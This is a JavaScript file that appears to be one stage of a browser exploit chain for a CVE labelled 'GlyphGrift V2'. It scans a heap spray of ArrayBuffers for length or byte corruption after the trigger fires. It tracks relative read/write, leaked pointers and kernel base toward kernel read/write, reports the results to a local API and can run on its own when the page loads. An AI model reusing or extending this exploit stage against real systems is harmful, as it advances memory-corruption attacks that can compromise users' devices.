/**
 * CVE-2026-86950 GlyphGrift V2 — Stage 6 post-trigger corruption scan.
 * Scans surviving ArrayBuffer spray for unexpected bytes / length anomalies.
 * Reports /api/glyphgrift-exploit-result. Never sets krw_ready without a real leak.
 */
(function () {
  'use strict';

  var API = '/api/glyphgrift-exploit-result';

  function expectedByte(marker, i) {
    return (marker + i) & 0xff;
  }

  function scanSpray() {
    var spray = window.__L0FCK_GLYPHGRIFT_SPRAY;
    var result = {
      corruption_detected: false,
      corrupted_buffer_index: -1,
      corrupted_offset: 0,
      corrupted_value: 0,
      relative_rw_achieved: false,
      leaked_ptr: 0,
      kbase: 0,
      krw_ready: false,
      error_message: ''
    };

    if (!spray || !spray.length) {
      result.error_message = 'no spray references';
      return result;
    }

    for (var i = 0; i < spray.length; i++) {
      if (!spray[i]) continue;
      var buf = spray[i];
      var len = buf.byteLength;
      if (typeof len !== 'number' || len <= 0) continue;

      /* Unexpected growth of byteLength would indicate metadata corruption */
      var expectedLen = window.__L0FCK_GLYPHGRIFT_SPRAY_ALLOC || len;
      if (len !== expectedLen) {
        result.corruption_detected = true;
        result.corrupted_buffer_index = i;
        result.corrupted_offset = 0;
        result.corrupted_value = len & 0xffff;
        result.relative_rw_achieved = true;
        result.error_message = 'byteLength anomaly ' + expectedLen + ' -> ' + len;
        /* Honest: length anomaly is userspace relative R/W signal — NOT kernel R/W */
        result.krw_ready = false;
        result.kbase = 0;
        result.leaked_ptr = 0;
        return result;
      }

      try {
        var u8 = new Uint8Array(buf);
        var marker = i & 0xff;
        for (var off = 0; off < u8.length; off++) {
          var exp = expectedByte(marker, off);
          if (u8[off] !== exp) {
            /* Single-byte delta of +1/+2 on adjacent u16 pattern is interesting */
            var delta = (u8[off] - exp) & 0xff;
            if (delta === 1 || delta === 2 || (off + 1 < u8.length &&
                ((u8[off] | (u8[off + 1] << 8)) !==
                 (exp | (expectedByte(marker, off + 1) << 8))))) {
              result.corruption_detected = true;
              result.corrupted_buffer_index = i;
              result.corrupted_offset = off;
              result.corrupted_value = u8[off] | ((off + 1 < u8.length ? u8[off + 1] : 0) << 8);
              result.relative_rw_achieved = false;
              result.krw_ready = false;
              result.kbase = 0;
              result.leaked_ptr = 0;
              result.error_message = 'content delta at offset ' + off;
              return result;
            }
          }
        }
      } catch (e) {
        result.error_message = String(e && e.message ? e.message : e);
      }
    }

    if (!result.corruption_detected) {
      result.error_message = 'no corruption observed in spray';
    }
    return result;
  }

  function postResult(payload) {
    return fetch(API, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    }).catch(function () {});
  }

  function execute(ctx) {
    if (ctx && ctx.log) ctx.log('glyphgrift post-trigger scan');
    var payload = scanSpray();
    return postResult(payload).then(function () {
      if (ctx && ctx.report) {
        var st = payload.corruption_detected ? 'corruption' : 'clean';
        return ctx.report('glyphgrift_post_trigger', st, JSON.stringify(payload));
      }
    });
  }

  window.__L0FCK_STAGE4_RUNNERS = window.__L0FCK_STAGE4_RUNNERS || {};
  window.__L0FCK_STAGE4_RUNNERS.glyphgrift_post_trigger = function (ctx) {
    return execute(ctx);
  };

  window.__L0FCK_GLYPHGRIFT_RUN_POST_TRIGGER = function () {
    return execute(null);
  };

  if (window.__L0FCK_GLYPHGRIFT_EXPLOIT === true &&
      window.__L0FCK_GLYPHGRIFT_AUTO_POST === true) {
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', function () { execute(null); });
    } else {
      setTimeout(function () { execute(null); }, 0);
    }
  }
})();
